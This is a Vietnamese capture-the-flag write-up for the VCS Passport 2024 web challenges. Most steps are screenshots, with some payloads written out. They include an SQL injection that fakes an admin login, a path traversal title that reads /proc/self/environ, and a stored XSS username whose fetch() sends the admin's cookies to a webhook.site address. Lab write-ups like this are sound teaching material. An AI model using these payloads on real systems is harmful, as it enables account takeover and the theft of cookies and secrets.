Source các challenge: https://github.com/DuongHaoNika/VCS_Passport_2024_Web

## Bài Web01-Flag1
Khi bấm vào link, mình thấy giao diện như sau:

![image](https://github.com/user-attachments/assets/6ff658e5-6eac-4c76-855e-a0f068b128aa)

Sau đó đọc source code thấy route /freeflag:

![image](https://github.com/user-attachments/assets/b1c152e8-ca35-4e35-af80-ddd8404476d7)

![image](https://github.com/user-attachments/assets/21719077-75c5-4f36-aa35-b99374801a54)

Sau đó thấy server trả về session như hình

![image](https://github.com/user-attachments/assets/54be6e44-c4b9-4334-b265-d18b783cbabd)

=> Có thể là jwt. Vào trang jwt.io check:

![image](https://github.com/user-attachments/assets/ddbb660a-9456-4f87-b68e-e2ca367d1aa0)

=> Flag: `VCS{Web01-Flag1-680c37cc-6147-4d08-8c11
29c91b2a50bf}`

## Bài Web01-Flag2

Sau khi đọc source code, thấy chỉ lấy được Flag02 trong trường hợp login với admin

![image](https://github.com/user-attachments/assets/818e8fed-f673-4ef0-abf5-32345153c4e0)

Trước tiên thì tìm hiểu xem cơ chế mà server xử lý login như nào

![image](https://github.com/user-attachments/assets/bee9d8e7-cfa2-4f65-83a0-729392068f35)

![image](https://github.com/user-attachments/assets/81ca0b0b-bd16-4541-afec-accf6709a5fd)

Hàm `execute` đã trực tiếp nối input của người dùng (username) vào trực tiếp câu lệnh SQL => SQLInjection
Server kiểm tra trước xem có tồn tại username không, nếu có thì lấy password đã
được hash md5 (lưu trữ) trong database, và lấy password người dùng nhập, hash md5
password đó => Kiểm tra xem 2 hash trùng nhau không => Trùng thì đăng nhập thành
công.

Hoàn toàn có thể tận dụng lỗi SQL Injection trên, union select 1 tài khoản admin
và 1 mật khẩu đã được mã hóa md5

![image](https://github.com/user-attachments/assets/a2ae19fc-82ce-494e-b830-1d75aecc975f)

Đọc source => Sử dụng SQLite3
 
Sau đó vào Burp Suite, chỉnh giá trị username như sau:

```abc") UNION SELECT 'admin', '202cb962ac59075b964b07152d234b70'-```

Password cung cấp: `123`

Ở đây để phần đầu username là abc, để server không tìm thấy user có username là
abc thì user phía sau được lấy => Fake được user admin

![image](https://github.com/user-attachments/assets/8cb57872-1fec-486e-a0d1-83f3be96e85c)

![image](https://github.com/user-attachments/assets/ef41237b-cb00-4c8c-afc1-ff9bd11555ba)

## Bài Web01-Flag3

Đọc file `start.sh`:

![image](https://github.com/user-attachments/assets/46e53fbb-de7c-4790-8ba2-009809fe2cab)

Thấy `$FLAG3` chưa unset => vẫn nằm trên environ của tiến trình. 

Khi đọc src thì mình nhận ra field `title` không hề được validate:

![image](https://github.com/user-attachments/assets/8e545b71-1856-46f5-a82a-a402e49906b6)

![image](https://github.com/user-attachments/assets/203c4e08-1a96-4575-8939-eca0baa1feff)

Ý tưởng là mình sẽ inject vào field `title` để thực hiện Path Traversal, đọc file `/proc/self/environ` hoặc `/proc/1/environ`

Đầu tiên mình tạo request với CURL:

```
curl.exe -X POST http://localhost:9001/upload-meme -F "meme=@dockerfile" -F "title=title" -x 127.0.0.1:8080 -v
```

Qua Burp Suite

![image](https://github.com/user-attachments/assets/38bc81eb-70b0-439d-96e0-33f95c8f643d)

![image](https://github.com/user-attachments/assets/45623108-09a2-4dd9-a0ec-c348ae27e682)

Sửa `title` => `aaaaaaaa", "../../../../../../../proc/self/environ") --`

![image](https://github.com/user-attachments/assets/e564fe87-8482-48f5-a650-c484860ad4c4)

## Bài Web04

![image](https://github.com/user-attachments/assets/3227a8a9-8a2e-4d30-9dca-61518c18e4a3)

Đây là code python, trong index có hàm render_template() không bị SSTI (render_template_string thì bị) 

Mình để ý đến `/feedback`

![image](https://github.com/user-attachments/assets/222453fd-2a1f-44ab-8f07-87264dafe107)

`subject` được đưa vào nối chuỗi => Có thể bị Path Traversal

Sau khi xem và tìm hiểu thì hàm unidecode() có thể chuyển `\`, `\\` về `/` => bypass được '/'

Xem docker và check được user có thể ghi vào folder `errors`

![image](https://github.com/user-attachments/assets/7f9c036e-8a96-466f-a311-be5a62aeb26d)

Ý tưởng là mình sẽ Path Traversal qua field `subject` và thực hiện lệnh gì đó qua field `content`

![image](https://github.com/user-attachments/assets/c37ebc67-3173-4d4d-b015-b9456bc0aaf5)

Lấy được flag trong config (`app.config['FLAG'] = os.environ['FLAG']`)

![image](https://github.com/user-attachments/assets/32689981-3073-4d73-86ce-894a6fa7a19f)

## Bài Web06

![image](https://github.com/user-attachments/assets/7ed53f13-bee9-4c5f-a6cd-5dfa0a469572)

Khi đọc source mình để ý 2 hàm dưới

![image](https://github.com/user-attachments/assets/c438988e-213f-466a-8fad-8e184f7262ee)

Check tiếp hàm register

![image](https://github.com/user-attachments/assets/0b141994-a8e7-4603-9db5-b3e7b5da7581)

 Nhận thấy `email` và `bio` đã bị filter XSS. Còn username được lấy từ
 `session[“username”]`. Mà `username` trong hàm register lấy trực tiếp từ người dùng
 => `username` là **untrusted data**
 
 Hàm report profile => khả năng được gửi lên để admin xem
 => sẽ ra sao nếu report 1 nick có username với payload xss để cướp cookie admin
 khi xem
Đầu tiên tạo 1 user có username:
 <script>fetch(`https://webhook.site/d15deb00-b0fb-43ad-a288
480ba00c2c37?cookie=${document.cookie}`)</script>

![image](https://github.com/user-attachments/assets/0bc89596-9dae-487e-8117-3093ac458c2d)

 Sau đó tạo user khác, mục đích để lấy nick này report nick trên

![image](https://github.com/user-attachments/assets/2f4beadc-27a7-4a6e-9aa8-f6f3bd68e262)

Ví dụ: http://localhost:9006/profile/3ab3a9de-3571-48a4-bb01-257486e69f3a

![image](https://github.com/user-attachments/assets/1a474131-6ce2-4fb1-aa96-a42e1acc66ed)

Check webhook

![image](https://github.com/user-attachments/assets/f02f255e-d72a-4c14-846f-fab4d0193d3f)

Flag: `VCS{web06-2f29cec6-b8ea-4126-a2cd-a213bb332150}`
